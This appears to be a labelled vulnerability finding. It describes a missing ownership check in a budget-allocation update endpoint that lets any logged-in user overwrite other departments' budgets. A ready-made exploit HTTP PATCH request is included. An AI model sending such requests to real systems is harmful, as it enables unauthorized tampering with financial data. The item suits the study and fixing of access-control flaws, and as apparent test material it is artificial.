diagnosis: update_budget_allocation allows revising allocated budget figures. The lookup DepartmentBudgetEntry.objects.filter(id=entry_id, allocated_amount_currency=currency) filters by currency, but does not check if request.user is the assigned manager or member of the entry's department. Any authenticated user can overwrite budget allocations for unrelated corporate departments.
exploit_request:
PATCH /api/budgets/entries/94/ HTTP/1.1
Host: erp.enterprisegrid.com
Authorization: Bearer 77d6c5b4...
Content-Type: application/json

{"allocation": "50000.00", "currency": "USD"}
